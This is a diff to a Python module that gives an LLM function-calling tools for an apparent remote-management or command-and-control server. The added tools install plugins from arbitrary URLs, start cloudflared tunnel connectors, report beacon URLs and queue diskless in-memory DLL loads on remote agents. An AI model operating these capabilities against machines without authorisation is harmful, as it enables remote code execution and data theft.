@@ -235,23 +235,73 @@ def tool_list_plugins(client: RmmApiClient) -> str:
     return _json_result({"ok": code == 200, "status": code, "data": data})
 
 
+def tool_list_assets(client: RmmApiClient, kind: str = "") -> str:
+    """List operator-managed URL-installed assets."""
+    code, data = client.list_assets(kind or None)
+    return _json_result({"ok": code == 200, "status": code, "data": data})
+
+
+def tool_add_asset(
+    client: RmmApiClient,
+    kind: str,
+    url: str,
+    name: str = "",
+    enabled: bool = True,
+) -> str:
+    """Download and install one operator asset from a URL."""
+    code, data = client.add_asset(kind, url, name or None, enabled)
+    return _json_result({"ok": code in (200, 201), "status": code, "data": data})
+
+
+def tool_set_asset_enabled(client: RmmApiClient, kind: str, name: str, enabled: bool) -> str:
+    """Enable or disable one managed operator asset."""
+    code, data = client.set_asset_enabled(kind, name, enabled)
+    return _json_result({"ok": code == 200, "status": code, "data": data})
+
+
+def tool_remove_asset(client: RmmApiClient, kind: str, name: str) -> str:
+    """Remove one managed operator asset."""
+    code, data = client.remove_asset(kind, name)
+    return _json_result({"ok": code == 200, "status": code, "data": data})
+
+
+def tool_profile_status(client: RmmApiClient) -> str:
+    """Return the active RMM-Profile and beacon URL."""
+    code, data = client.profile_status()
+    return _json_result({"ok": code == 200, "status": code, "data": data})
+
+
+def tool_start_profile(client: RmmApiClient, name: str = "cloudflared") -> str:
+    """Start one installed RMM-Profile connector."""
+    code, data = client.start_profile(name)
+    return _json_result({"ok": code == 200, "status": code, "data": data})
+
+
+def tool_stop_profile(client: RmmApiClient) -> str:
+    """Stop the active RMM-Profile connector."""
+    code, data = client.stop_profile()
+    return _json_result({"ok": code == 200, "status": code, "data": data})
+
+
 def tool_queue_pe_load(
     client: RmmApiClient,
     session_ref: str,
     plugin: str,
     export: str = "Run",
     plugin_input: str = "",
+    plugin_command: str = "",
 ) -> str:
     sid, _ = _resolve_session_id(client, session_ref)
     if not sid:
         return _json_result({"ok": False, "error": "session_not_found"})
-    code, data = client.queue_pe_load(sid, plugin, export=export, plugin_input=plugin_input)
+    code, data = client.queue_pe_load(
+        sid,
+        plugin,
+        export=export,
+        plugin_input=plugin_input,
+        command=plugin_command or None,
+    )
     return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})
-
-
-def tool_build_plugin(client: RmmApiClient, name: str, output: str = "") -> str:
-    code, data = client.build_plugin(name, output or None)
-    return _json_result({"ok": code == 200, "status": code, "data": data})
 
 
 def tool_queue_upload(
@@ -518,14 +568,25 @@ TOOL_HANDLERS = {
     "get_rclone_config": lambda c, a: tool_get_rclone_config(c),
     "queue_screenshot": lambda c, a: tool_queue_screenshot(c, a["session_ref"]),
     "list_plugins": lambda c, a: tool_list_plugins(c),
+    "list_assets": lambda c, a: tool_list_assets(c, a.get("kind", "")),
+    "add_asset": lambda c, a: tool_add_asset(
+        c, a["kind"], a["url"], a.get("name", ""), bool(a.get("enabled", True))
+    ),
+    "set_asset_enabled": lambda c, a: tool_set_asset_enabled(
+        c, a["kind"], a["name"], bool(a.get("enabled"))
+    ),
+    "remove_asset": lambda c, a: tool_remove_asset(c, a["kind"], a["name"]),
+    "profile_status": lambda c, a: tool_profile_status(c),
+    "start_profile": lambda c, a: tool_start_profile(c, a.get("name", "cloudflared")),
+    "stop_profile": lambda c, a: tool_stop_profile(c),
     "queue_pe_load": lambda c, a: tool_queue_pe_load(
         c,
         a["session_ref"],
         a["plugin"],
         a.get("export", "Run"),
         a.get("input", ""),
+        a.get("command", ""),
     ),
-    "build_plugin": lambda c, a: tool_build_plugin(c, a["plugin_name"], a.get("output", "")),
     "queue_upload": lambda c, a: tool_queue_upload(
         c, a["session_ref"], a["local_path"], a["remote_path"]
     ),
@@ -759,10 +820,99 @@ OPENAI_TOOLS: list[dict] = [
     {
         "type": "function",
         "function": {
+            "name": "list_assets",
+            "description": "List URL-installed plugins, AI skills, and rclone profile files.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "kind": {"type": "string", "enum": ["plugins", "skills", "rclone"]}
+                },
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "add_asset",
+            "description": "Download and install a plugin, AI skill, or rclone profile file from an HTTP(S) URL.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "kind": {"type": "string", "enum": ["plugins", "skills", "rclone"]},
+                    "url": {"type": "string"},
+                    "name": {"type": "string"},
+                    "enabled": {"type": "boolean"},
+                },
+                "required": ["kind", "url"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "set_asset_enabled",
+            "description": "Enable or disable one managed plugin, AI skill, or rclone asset.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "kind": {"type": "string", "enum": ["plugins", "skills", "rclone"]},
+                    "name": {"type": "string"},
+                    "enabled": {"type": "boolean"},
+                },
+                "required": ["kind", "name", "enabled"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "remove_asset",
+            "description": "Remove one managed operator asset.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "kind": {"type": "string", "enum": ["plugins", "skills", "rclone"]},
+                    "name": {"type": "string"},
+                },
+                "required": ["kind", "name"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "profile_status",
+            "description": "Show the active RMM-Profile and the beacon URL used by agents.",
+            "parameters": {"type": "object", "properties": {}},
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "start_profile",
+            "description": "Start an installed RMM-Profile connector such as cloudflared.",
+            "parameters": {
+                "type": "object",
+                "properties": {"name": {"type": "string", "default": "cloudflared"}},
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "stop_profile",
+            "description": "Stop the active RMM-Profile connector.",
+            "parameters": {"type": "object", "properties": {}},
+        },
+    },
+    {
+        "type": "function",
+        "function": {
             "name": "queue_pe_load",
             "description": (
-                "Queue a diskless PE plugin load on the Go agent: the plugin is "
-                "fetched from the server, mapped in memory, and the export is called."
+                "Queue a diskless PE plugin load on the Go agent. The plugin is "
+                "fetched from the server and mapped in an isolated child. Use "
+                "command for plugin-owned dispatch through the Run export."
             ),
             "parameters": {
                 "type": "object",
@@ -770,27 +920,16 @@ OPENAI_TOOLS: list[dict] = [
                     "session_ref": {"type": "string"},
                     "plugin": {"type": "string"},
                     "export": {"type": "string", "description": "Plugin export name (default Run)"},
+                    "command": {
+                        "type": "string",
+                        "description": (
+                            "Optional plugin-owned command. When set, the agent invokes "
+                            "Run and the plugin dispatches this command internally."
+                        ),
+                    },
                     "input": {"type": "string", "description": "Optional input passed to the export"},
                 },
                 "required": ["session_ref", "plugin"],
-            },
-        },
-    },
-    {
-        "type": "function",
-        "function": {
-            "name": "build_plugin",
-            "description": (
-                "Cross-compile a checked-in Go PE plugin on the RMM server; the "
-                "built DLL is served to Go agents from the server plugin directory."
-            ),
-            "parameters": {
-                "type": "object",
-                "properties": {
-                    "plugin_name": {"type": "string", "description": "Checked-in plugin target"},
-                    "output": {"type": "string", "description": "Output DLL name (default <plugin>.dll)"},
-                },
-                "required": ["plugin_name"],
             },
         },
     },
